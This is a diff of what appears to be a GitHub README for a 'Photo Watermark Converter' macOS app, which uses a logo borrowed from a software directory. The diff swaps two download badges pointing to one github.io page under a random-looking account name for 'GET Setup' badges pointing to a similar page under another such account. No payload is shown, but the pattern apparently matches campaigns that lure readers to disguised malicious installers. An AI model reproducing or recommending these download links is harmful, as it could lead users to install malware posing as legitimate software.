@@ -2,11 +2,7 @@
 
 ![Photo Watermark Converter Logo](https://static.macupdate.com/products/45684/m/photo-watermark-converter-logo.png?v=1583171591)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Photo">
-    <img src="https://img.shields.io/badge/⬇️_Download_Photo_Watermark_Converter-16a085?style=for-the-badge&logo=apple&logoColor=white" alt="Download Photo Watermark Converter for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://alinesankequvqdr.github.io/.github/Photo-Watermark)
 
 ---
 
@@ -106,11 +102,7 @@ No — your original files remain untouched unless you choose otherwise.
 **Is it suitable for professionals?**  
 Absolutely — it’s designed for both casual and professional use.  
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Photo">
-    <img src="https://img.shields.io/badge/⬇️_Download_Photo_Watermark_Converter-16a085?style=for-the-badge&logo=apple&logoColor=white" alt="Download Photo Watermark Converter for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://alinesankequvqdr.github.io/.github/Photo-Watermark)
 
 ---
 
